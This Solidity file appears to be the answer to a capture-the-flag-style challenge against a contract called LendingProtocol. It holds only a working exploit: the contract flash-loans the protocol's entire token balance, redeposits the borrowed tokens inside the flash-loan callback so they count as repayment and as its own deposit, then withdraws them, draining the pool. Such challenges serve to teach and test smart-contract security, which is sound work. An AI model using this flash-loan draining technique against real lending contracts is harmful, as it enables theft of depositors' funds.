// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../LendingProtocol.sol";


contract LendingProtocolSolution {
    LendingProtocol private lendingProtocol;

    constructor(address contractAddress){
        lendingProtocol = LendingProtocol(contractAddress);
    }

    function solve() public {
        address token = lendingProtocol.token();
        uint256 amount = IERC20(token).balanceOf(address(lendingProtocol));
        lendingProtocol.flashloan(amount);
        lendingProtocol.withdraw(amount);
    }

    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32){
        IERC20(token).approve(address(lendingProtocol), amount);
        lendingProtocol.supply(amount);
        return bytes32(0);
    }

}